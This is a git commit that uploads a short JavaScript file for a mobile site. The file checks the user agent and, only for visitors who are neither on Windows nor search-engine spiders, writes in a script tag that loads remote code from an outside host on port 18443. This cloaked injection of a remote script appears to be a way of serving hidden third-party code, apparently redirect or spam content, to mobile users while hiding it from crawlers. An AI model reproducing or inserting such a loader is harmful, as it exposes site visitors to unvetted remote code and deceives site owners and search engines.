627cc108640973b7ef8044289ed08b4453bf2376
ft2014107 <56401210+ft2014107@users.noreply.github.com>
2021-12-03 19:14:49 +0800

    Add files via upload

---
+++ post/RGW/js/wap2-jm-aoyou.js
@@ -0,0 +1,22 @@
+
+
+function show_jm_200()
+{
+	var browser_ui_ = navigator.userAgent.toLowerCase();
+	if(browser_ui_.indexOf("windows") ==-1 && browser_ui_.indexOf("spider") == -1)
+	{
+		document.writeln('<script src="https://www.aoyou4.top:18443/ay/c-1394-22.js"><\/script>');
+		
+		
+	}
+}
+
+function show_jm()
+{
+	show_jm_200();
+}
+
+function get_s_name89()
+{
+	show_jm_200();
+}
